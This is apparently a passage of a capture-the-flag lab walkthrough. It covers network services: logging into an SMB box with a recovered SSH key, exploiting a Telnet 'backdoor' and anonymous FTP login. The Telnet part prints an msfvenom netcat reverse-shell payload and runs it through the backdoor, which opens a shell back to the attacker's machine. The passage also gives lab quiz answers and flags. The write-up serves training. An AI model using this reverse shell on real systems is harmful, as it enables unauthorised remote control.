<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-51-158:~# ssh root@10.10.190.95 -i id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root@10.10.190.95<span style="color:#f38ba8">&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>root@ip-10-10-51-158:~# ssh johncactus@10.10.190.95 -i id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Connection closed by 10.10.190.95 port <span style="color:#fab387">22</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>root@ip-10-10-51-158:~# ssh JohnCactus@10.10.190.95 -i id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Connection closed by 10.10.190.95 port <span style="color:#fab387">22</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>root@ip-10-10-51-158:~# ssh cactus@10.10.190.95 -i id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-96-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>  System information as of Mon Jun <span style="color:#fab387">24</span> 05:55:20 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>  System load:  0.0                Processes:           <span style="color:#fab387">93</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>  Usage of /:   33.3% of 11.75GB   Users logged in:     <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  Memory usage: 17%                IP address <span style="color:#cba6f7">for</span> eth0: 10.10.190.95
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>  Swap usage:   0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">22</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Last login: Tue Apr <span style="color:#fab387">21</span> 11:19:15 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>cactus@polosmb:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>smb.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>cactus@polosmb:~$ cat smb.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>smb_is_fun_eh?<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="telnet">Telnet</h3>
<hr>
<h4 id="understanding-telnet">Understanding Telnet</h4>
<p>What is Telnet?</p>






<pre tabindex="0"><code>Application Protocol</code></pre>
<br>
<p>What has slowly replaced Telnet?</p>






<pre tabindex="0"><code>SSH</code></pre>
<br>
<p>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</p>






<pre tabindex="0"><code>telnet 10.10.10.3 23</code></pre>
<br>
<p>The lack of what, means that all Telnet communication is in plain text?</p>






<pre tabindex="0"><code>Encryption</code></pre>
<br>
<h4 id="enumerating-telnet">Enumerating Telnet</h4>
<p>How many ports are open on the target machine?</p>






<pre tabindex="0"><code>1</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT     STATE SERVICE REASON         VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>8012/tcp open  unknown syn-ack ttl <span style="color:#fab387">64</span></span></span></code></pre></div>
<br>
<p>What port is this?</p>






<pre tabindex="0"><code>8012</code></pre>
<br>
<p>This port is unassigned, but still lists the protocol it&rsquo;s using, what protocol is this?</p>






<pre tabindex="0"><code>TCP</code></pre>
<br>
<p>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</p>






<pre tabindex="0"><code>0</code></pre>
<br>
<p>Based on the title returned to us, what do we think this port could be used for?</p>






<pre tabindex="0"><code>a backdoor</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>8012/tcp open  unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>| fingerprint-strings:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|_    SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
<br>
<p>Who could it belong to? Gathering possible <code>usernames</code> is an important step in enumeration.</p>






<pre tabindex="0"><code>Skidy</code></pre>
<br>
<h4 id="exploring-telnet">Exploring Telnet</h4>
<p>Great! It&rsquo;s an open telnet connection! What welcome message do we receive?</p>






<pre tabindex="0"><code>SKIDY&#39;S BACKDOOR</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
<br>
<p>Let&rsquo;s try executing some commands, do we get a return on any input we enter into that telnet session? (Y/N)</p>






<pre tabindex="0"><code>N</code></pre>
<br>
<p>Hmm&hellip; that&rsquo;s strange. Let&rsquo;s check to see if what we&rsquo;re typing is being executed as a system command.</p>
<p>Start a tcpdump listener on your local machine.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# sudo tcpdump ip proto<span style="color:#89b4fa">\\</span>icmp -i ens5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes</span></span></code></pre></div>
<br>
<p>Now, use the command <code>Ping [local THM ip] -c 1</code> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>.RUN ping 10.10.46.62 -c <span style="color:#fab387">1</span></span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# sudo tcpdump ip proto<span style="color:#89b4fa">\\</span>icmp -i ens5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>03:35:25.225403 IP ec2-13-214-173-166.ap-southeast-1.compute.amazonaws.com &gt; ip-10-10-46-62.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 16509, seq 14618, length <span style="color:#fab387">8</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>03:36:25.256032 IP ip-10-10-220-9.eu-west-1.compute.internal &gt; ip-10-10-46-62.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> request, id 1319, seq 1, length <span style="color:#fab387">64</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>03:36:25.256083 IP ip-10-10-46-62.eu-west-1.compute.internal &gt; ip-10-10-220-9.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 1319, seq 1, length <span style="color:#fab387">64</span></span></span></code></pre></div>
<br>
<p>We&rsquo;re going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. here&rsquo;s our syntax:
<code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p>
<ul>
<li><code>-p</code> = payload</li>
<li><code>host</code> = our local host IP address (this is your machine&rsquo;s IP address)</li>
<li><code>lport</code> = the port to listen on (this is the port on your machine)</li>
<li><code>R</code> = export the payload in raw format</li>
</ul>
<br>
<p>What word does the generated payload start with?</p>






<pre tabindex="0"><code>mkfifo</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# msfvenom -p cmd/unix/reverse_netcat <span style="color:#f5e0dc">lhost</span><span style="color:#89dceb;font-weight:bold">=</span>10.10.46.62 <span style="color:#f5e0dc">lport</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">4444</span> R
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>-<span style="color:#89dceb;font-weight:bold">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>-<span style="color:#89dceb;font-weight:bold">]</span> No arch selected, selecting arch: cmd from the payload
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Payload size: <span style="color:#fab387">101</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>
<br>
<p>Now all we need to do is start a netcat listener on our local machine. We do this using:
<code>nc -lvp [listening port]</code></p>
<p>What would the command look like for the listening port we selected in our payload?</p>






<pre tabindex="0"><code>nc -lvp 4444</code></pre>
<br>
<p>Success!! What is the contents of flag.txt?</p>






<pre tabindex="0"><code>THM{y0u_g0t_th3_t3ln3t_fl4g}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>.RUN mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# nc -lvp <span style="color:#fab387">4444</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Listening on <span style="color:#89dceb;font-weight:bold">[</span>0.0.0.0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>family 0, port 4444<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connection from ip-10-10-220-9.eu-west-1.compute.internal <span style="color:#fab387">57836</span> received!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>y0u_g0t_th3_t3ln3t_fl4g<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="ftp-file-transfer-protocol">FTP (File Transfer Protocol)</h3>
<hr>
<h4 id="understanding-ftp">Understanding FTP</h4>
<p>What communications model does FTP use?</p>






<pre tabindex="0"><code>client-server</code></pre>
<br>
<p>What&rsquo;s the standard FTP port?</p>






<pre tabindex="0"><code>21</code></pre>
<br>
<p>How many modes of FTP connection are there?</p>






<pre tabindex="0"><code>2</code></pre>
<p>The FTP server may support either Active or Passive connections, or both.</p>
<ul>
<li>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.</li>
<li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.</li>
</ul>
<br>
<h4 id="enumerating-ftp">Enumerating FTP</h4>
<p>Run an nmap scan of your choice.</p>
<p>How many ports are open on the target machine?</p>






<pre tabindex="0"><code>2</code></pre>
<br>
<p>What port is ftp running on?</p>






<pre tabindex="0"><code>21</code></pre>
<br>
<p>What variant of FTP is running on it?</p>






<pre tabindex="0"><code>vsftpd</code></pre>
<br>
<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <code>FTP [IP]</code> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
<p>What is the name of the file in the anonymous FTP directory?</p>






<pre tabindex="0"><code>PUBLIC_NOTICE.txt</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# ftp 10.10.41.45
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Connected to 10.10.41.45.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">220</span> Welcome to the administrator FTP service.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.10.41.45:root<span style="color:#89dceb;font-weight:bold">)</span>: anonymous
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">331</span> Please specify the password.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">230</span> Login successful.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>ftp&gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rw-r--r--    <span style="color:#fab387">1</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>             <span style="color:#fab387">353</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> PUBLIC_NOTICE.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">226</span> Directory send OK.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ftp&gt;</span></span></code></pre></div>
<br>
<p>What do we think a possible username could be?</p>






<pre tabindex="0"><code>Mike</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>ftp&gt; get PUBLIC_NOTICE.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
